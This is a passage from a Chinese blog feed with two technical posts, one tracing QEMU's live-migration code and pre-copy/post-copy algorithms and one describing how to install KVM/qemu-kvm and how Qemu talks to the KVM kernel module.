&lt;p&gt;重点说一下&lt;code&gt;migrate_fd_connect&lt;/code&gt;函数与&lt;code&gt;migrate_fd_put_ready&lt;/code&gt;函数，&lt;br&gt;&lt;code&gt;migrate_fd_connect&lt;/code&gt;函数主要调用了&lt;code&gt;qemu_savevm_state_begin&lt;/code&gt;函数进行迁移工作的初始化工作（对应于前文说的迁移过程的第一阶段），而&lt;code&gt;migrate_fd_connect&lt;/code&gt;函数主要调用了&lt;code&gt;qemu_savevm_state_iterate&lt;/code&gt;函数（对应第二阶段）与&lt;code&gt;qemu_savevm_state_complete&lt;/code&gt;函数（对应第三阶段），这里注意，此三个函数（&lt;code&gt;qemu_savevm_state_beging&lt;/code&gt;,&lt;code&gt;qemu_savevm_state_iterate&lt;/code&gt;,&lt;code&gt;qemu_savevm_state_complete&lt;/code&gt;)里面代码结构非同类似，必有蹊跷，这里贴出其中的&lt;code&gt;qemu_savevm_state_iterate&lt;/code&gt;函数：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;qemu_savevm_state_iterate&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(QEMUFile *f)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SaveStateEntry *se;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; ret = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    QTAILQ_FOREACH(se, &amp;amp;savevm_handlers, entry) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (se-&amp;gt;save_live_state == &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* Section type */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        qemu_put_byte(f, QEMU_VM_SECTION_PART);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        qemu_put_be32(f, se-&amp;gt;section_id);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ret = se-&amp;gt;save_live_state(f, QEMU_VM_SECTION_PART, se-&amp;gt;opaque);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (ret &amp;lt;= &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;comment&quot;&gt;/* Do not proceed to the next vmstate before this one reported&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;               completion of the current stage. This serializes the migration&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;               and reduces the probability that a faster changing state is&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;               synchronized over and over again. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (ret != &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        return ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ret = qemu_file_get_error(f);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (ret != &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        qemu_savevm_state_cancel(f);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;三个函数都会有一句代码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ret = se-&amp;gt;save_live_state(f, QEMU_VM_SECTION_PART, se-&amp;gt;opaque); 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;只是其中参数不同。&lt;/p&gt;
&lt;p&gt;这个save_live_state是什么？&lt;/p&gt;
&lt;p&gt;注意，非常重要，存在于虚拟机迁移的核心结构体SaveStateEntry中：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; SaveStateEntry &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    QTAILQ_ENTRY(SaveStateEntry) entry;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; idstr[&lt;span class=&quot;number&quot;&gt;256&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; instance_id;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; alias_id;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; version_id;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; section_id;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SaveSetParamsHandler *set_params;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SaveLiveStateHandler *save_live_state;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SaveStateHandler *save_state;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    LoadStateHandler *load_state;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; VMStateDescription *vmsd;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *opaque;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    CompatEntry *compat;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; no_migrate;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; is_ram;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; SaveStateEntry;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;此结构体存储了虚拟机迁移的用到的所有数据结构，主要包括被传输设备的存储格式以及被调用的具体设备的迁移功能函数. 那指针 &lt;code&gt;*save_live_state&lt;/code&gt; 到底做了什么，一一追踪可发现，在&lt;code&gt;vl.c&lt;/code&gt;文件中的main函数中（整个qemu程序的开始),针对ram设备，可发现如下一段代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;register_savevm_live(NULL, &amp;quot;ram&amp;quot;, 0, 4, NULL, ram_save_live, NULL, ram_load, NULL);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;正是&lt;code&gt;register_savem_live&lt;/code&gt;函数将&lt;code&gt;ram_save_live&lt;/code&gt;指针传递给了&lt;code&gt;save_live_state&lt;/code&gt;，前文说了，&lt;code&gt;ram_save_live&lt;/code&gt;便是真正执行迁移工作的函数，这里如果需要自定义迁移工作，修改&lt;code&gt;ram_save_live&lt;/code&gt;注册到&lt;code&gt;register_savevm_live&lt;/code&gt;函数中就行了。了解清楚这一连串的函数调用关系，便能彻底明白迁移的每一步工作。&lt;/p&gt;
&lt;h2 id=&quot;思考&quot;&gt;&lt;a href=&quot;#思考&quot; class=&quot;headerlink&quot; title=&quot;思考&quot;&gt;&lt;/a&gt;思考&lt;/h2&gt;&lt;p&gt;本文重点介绍了pre-copy迁移算法的详细过程，并简单介绍了post-copy算法，两个算法各有优缺点，也都各有改进之处。虚拟机迁移的初衷是保证云平台的高可用性，高可用性要尽量减少提供服务的云主机的宕机时间即停机时间，在此同时，也应尽量减少迁移过程中带来的性能开销，就像post-copy若不断的缺页，虽保证了极短的宕机时间，但如果性能损失太大也是无法接受的。目前多数优化迁移算法的工作主要是采取减少传输的内存数据量来实现，而为了减少内存数据量，又有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;压缩内存&lt;/li&gt;
&lt;li&gt;基于hash指纹找出相同或类似页面去重&lt;/li&gt;
&lt;li&gt;尽可能传输不必要的页面如free页面等&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;除此之外，也有工作不传输整个内存页面，而是传输内存页面到外部设备的映射关系，目的端则靠此映射关系从外设获取数据。这里不一一列出相关论文，若有兴趣深入者，可自行查阅。笔者也有一部分工作提出了相应的思路与实现，之后会有专门文章作详细介绍。&lt;/p&gt;
&lt;p&gt;如果你对迁移算法的优化有什么看法或什么建议，可留言，也可直接与我邮件联系。&lt;/p&gt;
&lt;h2 id=&quot;参考&quot;&gt;&lt;a href=&quot;#参考&quot; class=&quot;headerlink&quot; title=&quot;参考&quot;&gt;&lt;/a&gt;参考&lt;/h2&gt;&lt;p&gt;崔磊先生的博士论文&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.usenix.org/legacy/event/nsdi05/tech/full_papers/clark/clark.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;NSDI’05 Live Migration of Virtual Machines&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cs.binghamton.edu/~mhines/papers/vee2009.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;VEE’09 Post-Copy Based Live Virtual Machine Migration Using Adaptive Pre-Paging and Dynamic Self-Ballooning&lt;/a&gt; &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;/p&gt;
&lt;p&gt;如转载本文请注明出处:&lt;a href=&quot;http://www.chongh.wiki/blog/2016/01/02/highavailability-migration/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.chongh.wiki/blog/2016/01/02/highavailability-migration/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;作者[新浪微博：&lt;a href=&quot;http://weibo.com/2767520802/profile?rightmod=1&amp;amp;wvr=6&amp;amp;mod=personinfo&amp;amp;is_all=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@diting0x&lt;/a&gt;]&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;无序，直接看文章。&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;什么是云平台高可用&lt;/li&gt;
&lt;li&gt;虚拟机迁移主要算法&lt;/li&gt;
&lt;li&gt;实现 Pre-copy&lt;/li&gt;
&lt;li&gt;思考&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;什么是云平台高可用&quot;&gt;&lt;a href=&quot;#什么是云平台高可用&quot; class=&quot;headerlink&quot; title=&quot;什么是云平台高可用&quot;&gt;&lt;/a&gt;什么是云平台高可用&lt;/h2&gt;&lt;p&gt;云，一个再熟悉不过的词了。大家都看到了云计算的商业价值，于是乎各大IT公司都纷纷提出自己的云计算服务，有Amozon的EC2，微软的Azure,谷歌的Google AppEngine,腾讯云，百度云，阿里云等。说到Google AppEngine，相信许多用goagent翻墙党都用过这个东西，但估计大家都只忙着使用goagent，却忽略了AppEngine其中提供的云服务。如今，云无处不在，从当今主流产品看，云平台需要满足以下几个需求：&lt;/p&gt;
    
    </summary>
    
      <category term="virtualization" scheme="http://yoursite.com/categories/virtualization/"/>
    
    
      <category term="Virtualization" scheme="http://yoursite.com/tags/Virtualization/"/>
    
      <category term="Migration" scheme="http://yoursite.com/tags/Migration/"/>
    
      <category term="Cloud" scheme="http://yoursite.com/tags/Cloud/"/>
    
  </entry>
  
  <entry>
    <title>KVM/Qemu虚拟机简介</title>
    <link href="http://yoursite.com/blog/2016/01/01/kvm-qemu-bytalk/"/>
    <id>http://yoursite.com/blog/2016/01/01/kvm-qemu-bytalk/</id>
    <published>2016-01-01T21:05:23.000Z</published>
    <updated>2016-04-21T20:51:19.000Z</updated>
    
    <content type="html">&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;KVM/Qemu选择与部署&lt;/li&gt;
&lt;li&gt;KVM/Qemu原理概览&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;KVM-Qemu选择与部署&quot;&gt;&lt;a href=&quot;#KVM-Qemu选择与部署&quot; class=&quot;headerlink&quot; title=&quot;KVM/Qemu选择与部署&quot;&gt;&lt;/a&gt;KVM/Qemu选择与部署&lt;/h2&gt;&lt;p&gt;KVM作为虚拟机监控器VMM，分为两部分，分别是运行于kernel模式的KVM内核模块（kvm-kmod)和运行于user模式的Qemu模块。KVM的具体实现下文会作简单介绍。先来看kvm-kmod部分，linux kernel从2.6版本开始便开始集成了KVM模块，如果你只想简单的使用KVM，只需简单编译和配置内核即可使用KVM的一切特性，这里不作介绍，如果你想基于KVM做开发，还是老老实实去&lt;a href=&quot;http://sourceforge.net/projects/kvm/files/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;kvm官网&lt;/a&gt;下载，自己源码安装吧，在选择KVM版本之前，可以打开任意一个版本例如kvm-kmod-3.8里面的configure文件，可看到以下代码：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# minimum is 2.6.x&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;min_kernel_version=24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# maximum is 3.x&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;max_kernel_version=8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;kernel_version=`echo $kernel_version_str | sed &amp;apos;s/\([0-9]*\)\.[0-9]*\.[0-9]*.*/\1/&amp;apos;`&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;kernel_patchlevel=`echo $kernel_version_str | sed &amp;apos;s/[0-9]*\.\([0-9]*\)\.[0-9]*.*/\1/&amp;apos;`&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;kernel_sublevel=`echo $kernel_version_str | sed &amp;apos;s/[0-9]*\.[0-9]*\.\([0-9]*\).*/\1/&amp;apos;`&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;if [ ! -n &amp;quot;$force_build&amp;quot; ]; then&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	if [ $kernel_version -eq 2 ] &amp;amp;&amp;amp; [ $kernel_sublevel -lt $min_kernel_version ]; then&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		echo&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		echo &amp;quot;Error: kernel is too old for this kvm-kmod release.&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		echo&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		exit 1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	elif [ $kernel_version -eq 3 ] &amp;amp;&amp;amp; [ $kernel_patchlevel -gt $max_kernel_version ]; then&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		echo&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		echo &amp;quot;Error: kernel is more recent than KVM modules delivered with this release.&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		echo &amp;quot;You probably want to use the KVM support that is already part of your kernel.&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		echo&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		exit 1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	fi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;fi&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这段代码仔细看看，就不难看出kvm-kmod版本的每个数字和kernel版本号都是有关联的，kvm-kmod毕竟是一个内核模块，必须去适应内核，大家如果在安装kvm-kmod时出现kernel is too old 或者kernel is more recent等错误就应该静下来好好看看这段代码了。下载后匹配的kvm-kmod后，安装很简单，只需要执行&lt;code&gt;./configure
make $$ make install&lt;/code&gt;即可&lt;/p&gt;
&lt;p&gt;安装之后，有两个模块&lt;code&gt;kvm.ko kvm-intel.ko&lt;/code&gt;便会生成在./kvm/x86文件夹中，执行&lt;code&gt;insmod kvm.ko kvm-intel.ko&lt;/code&gt; 或者&lt;code&gt;modprobe kvm.ko kvm-intel.ko&lt;/code&gt;，便成功将kvm模块加载到内核了，&lt;br&gt;如果期间出现错误，可执行&lt;code&gt;lsmod | grep kvm&lt;/code&gt; 看kvm是否成功加载，或执行&lt;code&gt;dmesg | grep kvm&lt;/code&gt;查看具体执行信息。&lt;br&gt;这里强调，kvm-kmod是内核的一个模块，可随时加载随时删除，因此基于kvm的开发，修改kvm的源码之后，编译与运行起来都很方便。&lt;/p&gt;
&lt;p&gt;qemu-kvm是为兼容kvm基于qemu模拟器开发出来的一个分支版本，安装qemu-kvm之前，检查是否有以下依赖包： &lt;code&gt;linux-kernel-headers zlib1g-dev libglib2.0-dev&lt;/code&gt;，如果没有&lt;code&gt;apt-get install&lt;/code&gt;一下。&lt;br&gt;之后,执行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./configure --prefix=/usr/local/kvm 
make &amp;amp;&amp;amp; make install
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;即可，qemu-kvm便会安装到/usr/local/kvm路径下，安装成功后，会在此路径的/bin文件夹下出现qemu-img, qemu-system-x86_64等二进制文件,自己也可以选择将这些二进制文件拷贝到根目录下的/bin文件夹中，这样在执行这些二进制文件的时候就不用加前缀/usr/local/kvm/bin了。&lt;br&gt;执行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/usr/local/kvm/bin/qemu-img create -f qcow2 imgname.img 10G 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;创建一个qcow2格式的空虚拟机img文件&lt;br&gt;执行： &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/usr/local/kvm/bin/qemu-system-x86_64 -hda imgname.img -m 1024 -vnc :1 -cdrom imgname.iso -boot d     
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将imgname.iso系统安装到imgname.img中&lt;br&gt;之后利用xvnc4viewer等vnc软件连接虚拟机完成安装过程，安装完后，执行:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/usr/local/kvm/bin/qemu-system-x86_64 -hda imgname.img -vnc :1 -m 1024 -monitor stdio  
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;登陆到虚拟机。具体细节可自行摸索。&lt;/p&gt;
&lt;h2 id=&quot;KVM-Qemu原理概览&quot;&gt;&lt;a href=&quot;#KVM-Qemu原理概览&quot; class=&quot;headerlink&quot; title=&quot;KVM/Qemu原理概览&quot;&gt;&lt;/a&gt;KVM/Qemu原理概览&lt;/h2&gt;&lt;p&gt;说说kvm与qemu的关系，借用实验室某大神给的一张图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppf1.com1.z0.glb.clouddn.com/kvm-qemu.png&quot; alt=&quot;kvm-qemu&quot;&gt;&lt;/p&gt;
&lt;p&gt;可以看到，这里有三种模式，第一是客户机执行时所处的Guest模式，也就是虚拟化技术VMX中的非Root模式；第二是KVM运行的Kernel模式，即VMX中的Root模式，此时特权级为0；第三是Qemu运行的User模式，处于VMX Root模式中的特权级3.有关VMX技术，以及非Root模式如何通过VM Exit进入到Root模式，Root模式如何通过VM Entry进入到非Root模式，可参考Intel系统编程手册。&lt;/p&gt;
&lt;p&gt;简单说说Qemu所在的User模式如何与KVM所在的kernel模式交互，虚拟化中的VT-x技术的支持，使得KVM可以虚拟出多个虚拟处理器VCPU, 而这些VCPU对应每一个Qemu线程，VCPU的创建、初始化、运行以及退出都是在Qemu线程的上下文中进行，这些过程都是通过Qemu向KVM发送一个I/O通道管理函数ioctl来完成，以qemu-kvm-1.1.2为例，qemu-kvm中首先会在&lt;code&gt;./linux-header/linux/kvm.h&lt;/code&gt;注册相应的ioctl,如&lt;code&gt;#define KVM_GET_REGS              _IOR(KVMIO,  0x81, struct kvm_regs)&lt;/code&gt;，各参数含义可以具体去了解ioctl的实现方式，之后调用&lt;code&gt;kvm_vcpu_ioctl(env,KVM_GET_REGS,&amp;amp;regs)&lt;/code&gt;（有些也会调用kvm_vm_ioctl），KVM-Kmod中也会注册相应的ioctl，之后真正执行时会调用KVM_Kmod的相应函数，一般会在&lt;code&gt;kvm_main.c&lt;/code&gt;文件中定义。如果想自定义自己的函数，需要分别在qemu-kvm与kvm-kmod注册相应的ioctl，只要编号不重复即可，注册后再调用自己定义的函数。&lt;/p&gt;
